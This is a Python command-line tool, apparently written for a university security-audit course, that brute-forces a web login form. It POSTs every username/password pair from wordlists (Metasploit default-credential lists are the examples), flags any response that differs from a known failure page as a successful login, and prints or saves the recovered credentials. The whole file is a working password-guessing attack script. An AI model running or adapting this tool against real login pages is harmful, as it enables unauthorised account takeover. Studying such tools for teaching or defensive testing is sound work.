#!/usr/bin/python
import sys, getopt
import requests
#import hashlib

url =""
user_option = ""
password_option =""
verbose_mode = False
username_wordlist =""
password_wordlist =""
output = ""
testall = False
def progress(count, total, status=''):
	bar_len = 60
	filled_len = int(round(bar_len * count / float(total)))

	percents = round(100.0 * count / float(total), 1)
	bar = '=' * filled_len + '-' * (bar_len - filled_len)

	sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
	sys.stdout.flush()

def printStartMessage():
	print("---------------------------------------------------------------------")
	print("				r3d_i3p3		")
	print("			Brutforce POST request		")
	print("			USTHB-SSI-M2	Audit			")
	print("----------------------------------------------------------------------")

def printHelp():
	print("usage : ")
	print("brutforce_post.py -l <url> -u <user_post_option> -p <password_post_option> -s <username wordlist> -a <password wordlist> -v")
	print("\t-h\t\t--help\t\t\t\tTo print this message.")
	print("\t-l\t\t--url\t\t\t\tweb page (ex : -l http://test.com/login.php).")
	print("\t-u\t\t--user_option\t\t\tusername input name on form (ex: -u user).")
	print("\t-p\t\t--pass_option\t\t\tpassword input name on fomr (ex: -p pass).")
	print("\t-s\t\t--username_wordlist\t\ttfile with usernames to test (ex: -s /usr/share/wordlists/metasploit/http_default_users.txt.")
	print("\t-a\t\t--password_wordlist\t\tfile with passwords to test (ex: -a /usr/share/wordlists/metasploit/http_default_pass.txt.")
	print("\t-v\t\t--verbose\t\t\tto active verbose mode (show evrey tentative).")
	print("\t-t\t\t--testall\t\t\tto test all, without stop after a correcte user,pass.")
	print("\t-o\t\t--output\t\t\tfile to save correct user,pass.")

def attack():
	c_test = 0 

	username_wordlist_file = open(username_wordlist,"r")
	password_wordlist_file = open(password_wordlist,"r")
	usernames = username_wordlist_file.readlines()
	passwords = password_wordlist_file.readlines()
	username_wordlist_file.close()
	password_wordlist_file.close()

	m_user = len(usernames)
	print("usernames wordlist " + username_wordlist + " with " + str(m_user) +" usernames" ) 
	m_pass = len(passwords)
	print("usernames wordlist " + password_wordlist + " with " + str(m_pass) +" passwords" )
	if(output !=""):
		output_file = open(output, "a")
	error_content = requests.post(url,{str(user_option):"adadadadadadad",str(password_option):"adada"})
	#print(hashlib.md5(str(error_content.content).encode()).hexdigest() )
	print("starting ....")
	for username in usernames:
		for password in passwords:
			response = requests.post(url,{str(user_option):str(username[0:-1]),str(password_option):str(password[0:-1])})
			if(response.content == error_content.content):
				c_test += 1 
				if(verbose_mode):
					print("USERNAME:"+username[0:-1]+"      PASSWORD:"+password[0:-1] + " CODE : " +str(response.status_code))
			else:
				print("ERICAAAAAAAAAAAAAA !!!!!!!!!!!! LOGIN DONE")
				print(" : USERNAME:"+username[0:-1]+"      PASSWORD:"+password[0:-1] + " CODE : " +str(response.status_code))
				if(output !=""):
					output_file.write(username[0:-1] +":"+password[0:-1])
				if(testall == False):
					sys.exit(1)

		progress(c_test, m_user*m_pass, status='username :' + username)
		#endFor
	#endFor
	print("good bye :-")
	


try:
	printStartMessage()
	
	opts, args = getopt.getopt(sys.argv[1:], 'thvl:u:p:s:a:o:', ['testall','help', 'verbose', "url=","user_option=","pass_option=","username_wordlist=","password_wordlist=","output="])
	
except getopt.GetoptError as err:
	print(err)
	printHelp()
	sys.exit(2)
except:
	print("err")
for opt, arg in opts:
	if opt in ("-h", "--help"):
		printHelp()
		#print 'brutforce_post.py -u url -user <user_post_option> -pass <password_post_option> -usrwl <username wordlist> -passwl <password wordlist> -v'
		sys.exit(1)
	elif opt in ("-v", "--verbose"):
		verbose_mode = True
	elif opt in ("-l", "--url"):
		url = arg
	elif opt in ("-u", "--user_option"):
		user_option = arg
	elif opt in ("-p", "--password_option"):
		password_option = arg
	elif opt in ("-s", "--username_wordlist"):
		username_wordlist = arg
	elif opt in ("-a", "--password_wordlist"):
		password_wordlist = arg
	elif opt in ("-o", "--output"):
		output = arg
	elif opt in ("-t", "--testall"):
		testall = True

if(len(sys.argv[1:]) < 5):
	print(getopt.GetoptError("the command is not complte"))
	printHelp()
	sys.exit(2)
attack()
	